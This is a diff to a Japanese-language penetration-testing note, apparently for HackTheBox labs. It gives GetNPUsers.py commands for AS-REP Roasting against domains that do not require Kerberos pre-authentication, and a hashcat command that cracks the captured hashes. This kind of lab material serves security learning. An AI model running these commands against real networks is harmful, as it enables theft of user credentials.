@@ -3,14 +3,19 @@
 ASREPRoast攻撃により**Kerberos事前認証が不要**なユーザーを探索しそのパスワードハッシュの取得を狙う。
 
 ```
+# specific user 
 ┌──(kali㉿kali)-[~]
-└─$ GetNPUsers.py megabank.local/ -usersfile users.txt -format hashcat -outputfile hash.txt -no-pass -dc-ip 10.10.10.169
+└─$ GetNPUsers.py -no-pass -dc-ip 10.10.10.52 htb.local/mantis
+
+# Using user list
+┌──(kali㉿kali)-[~]
+└─$ GetNPUsers.py htb.local/ -no-pass -dc-ip 10.10.10.161 -usersfile users.txt 
 ```
 
-**krb5asrep**タイプのハッシュをクラック：
+**krb5asrep**ハッシュのクラック：
 
 ```
-┌──(kali㉿kali)-[~]                                                                                                                                                                                              
+┌──(kali㉿kali)-[~]
 └─$ hashcat -a 0 -m 18200 hashfile /usr/share/wordlists/rockyou.tx
 ```
 
